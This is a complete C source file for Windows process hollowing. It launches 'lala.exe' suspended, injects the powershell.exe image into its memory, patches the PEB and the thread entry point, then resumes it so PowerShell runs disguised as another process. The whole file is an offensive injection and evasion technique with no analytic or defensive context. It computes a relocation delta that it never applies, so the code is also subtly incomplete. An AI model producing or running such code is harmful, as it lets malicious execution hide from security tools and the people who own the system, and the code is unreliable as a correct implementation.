#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main() {
    char* target = "lala.exe"; 
    char* source = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Error: Target process creation failed (%d)\n", GetLastError());
        return 1;
    }

    HANDLE hFile = CreateFileA(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE fileBuffer = (PBYTE)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);

    // Instead of Unmapping, we allocate new memory in the target process
    // This avoids STATUS_INVALID_IMAGE_FORMAT in many cases
    PVOID remoteImage = VirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        printf("Error: Memory allocation failed (%d)\n", GetLastError());
        return 1;
    }

    // Calculate the Delta for relocations (Difference between preferred and actual address)
    DWORD64 delta = (DWORD64)remoteImage - ntHeaders->OptionalHeader.ImageBase;

    // Write Headers
    WriteProcessMemory(pi.hProcess, remoteImage, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Write Sections
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PVOID)((PBYTE)remoteImage + sectionHeader[i].VirtualAddress);
        PVOID src = (PVOID)((PBYTE)fileBuffer + sectionHeader[i].PointerToRawData);
        WriteProcessMemory(pi.hProcess, dest, src, sectionHeader[i].SizeOfRawData, NULL);
    }

    // Update the PEB ImageBaseAddress so the process knows where it lives
    PROCESS_BASIC_INFORMATION pbi;
    pNtQueryInformationProcess NtQueryInfo = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    NtQueryInfo(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    WriteProcessMemory(pi.hProcess, (PCHAR)pbi.PebBaseAddress + 0x10, &remoteImage, sizeof(PVOID), NULL);

    // Set the entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    printf("Successfully hollowed into %s. PID: %d\n", target, pi.dwProcessId);

    free(fileBuffer);
    return 0;
}